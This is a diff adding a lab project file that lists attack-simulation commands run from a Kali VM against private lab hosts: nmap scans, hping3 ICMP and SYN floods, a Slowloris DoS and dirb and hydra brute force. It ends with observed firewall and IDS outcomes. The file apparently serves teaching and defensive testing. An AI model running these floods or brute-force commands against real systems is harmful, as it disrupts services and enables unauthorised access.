@@ -1,0 +1,99 @@
+===============================
+Advanced Network Security Project
+Attack Simulation Commands
+===============================
+
+This file contains all the commands used during attack simulations 
+performed from the Kali Linux VM against LAN/DMZ targets 
+(192.168.1.101, 192.168.2.10, 192.168.1.104 etc.)
+
+------------------------------------------------
+1. NMAP Scanning
+------------------------------------------------
+
+# Basic SYN Scan against DMZ server
+nmap -sS 192.168.2.10
+
+# Intense scan against DMZ server
+nmap -A 192.168.2.10
+
+# Stealth scan against LAN server (blocked by firewall)
+nmap -A 192.168.1.10
+
+# Version + OS detection scan
+nmap -sV -O 192.168.2.10
+
+------------------------------------------------
+2. ICMP Flood Attack (HPING3)
+------------------------------------------------
+
+# ICMP flood against DMZ server
+sudo hping3 -1 --flood -V 192.168.2.10
+
+# ICMP flood against LAN host (blocked)
+sudo hping3 -1 --flood -V 192.168.1.101
+
+# ICMP flood against LAN host .104 (blocked)
+sudo hping3 -1 --flood -V 192.168.1.104
+
+------------------------------------------------
+3. TCP SYN Flood Attack (HPING3)
+------------------------------------------------
+
+# SYN flood on port 80 (DMZ server)
+sudo hping3 -S --flood -p 80 192.168.2.10
+
+# SYN flood on port 22 (LAN host)
+sudo hping3 -S --flood -p 22 192.168.1.104
+
+------------------------------------------------
+4. Slowloris Attack
+------------------------------------------------
+
+# Slow HTTP Request DoS against Apache Web Server
+slowhttptest -c 500 -H -g -o slowloris-test \
+    --test-type=slowloris \
+    -X -r 200 -w 10 \
+    -k 3 \
+    -u http://192.168.2.10/index.html
+
+------------------------------------------------
+5. Directory Brute Force (DIRB)
+------------------------------------------------
+
+# Directory enumeration against DMZ Apache server
+dirb http://192.168.2.10/
+
+------------------------------------------------
+6. Hydra Brute Force Attempt
+------------------------------------------------
+
+# HTTP GET brute force attack (password list missing – simulation)
+hydra -l admin -P /usr/share/wordlists/rockyou.txt \
+      192.168.2.10 http-get /
+
+# If password file not found, alternative example:
+hydra -l admin -P /usr/share/wordlists/common.txt \
+      192.168.2.10 http-get /
+
+------------------------------------------------
+7. Observed Outcomes (Summary)
+------------------------------------------------
+
+✔ Attacks on DMZ server (192.168.2.10):
+    - Nmap scans succeeded
+    - ICMP flood successful & visible in Wireshark
+    - SYN flood visible in Wireshark
+    - Slowloris impacted web responsiveness
+    - Dirb scan enumerated endpoints
+    - Hydra attempted (wordlist missing)
+
+✔ Attacks on LAN hosts (192.168.1.x):
+    - Blocked by pfSense firewall rules
+    - Nmap returned "0 hosts up"
+    - ICMP/SYN flood did not reach targets
+    - Suricata generated alerts for blocked traffic
+
+------------------------------------------------
+End of File
+------------------------------------------------
